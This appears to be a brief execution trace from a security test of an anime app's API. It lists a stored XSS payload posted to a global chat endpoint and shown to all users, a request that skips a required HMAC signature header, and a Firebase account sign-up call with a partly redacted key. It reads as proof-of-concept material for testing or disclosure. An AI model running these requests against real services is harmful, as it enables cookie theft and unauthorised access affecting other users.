# EXECUTION TRACE

### XSS in Chat
```
POST /api/v1/global-chats
Authorization: Bearer <firebase_jwt>
Content-Type: application/json

{"message": "<script>alert(document.cookie)</script>"}
```
Response: `200 OK` — payload stored and visible to all users.

### HMAC Bypass
```
GET /api/v1/anime
Authorization: Bearer <firebase_jwt>
Accept: application/json
```
No `X-Miku-Signature` header needed — returns full anime list.

### Account Creation
```
POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyBPi[REDACTED]
Content-Type: application/json

{"email": "test@test.com", "password": "test123", "returnSecureToken": true}
```

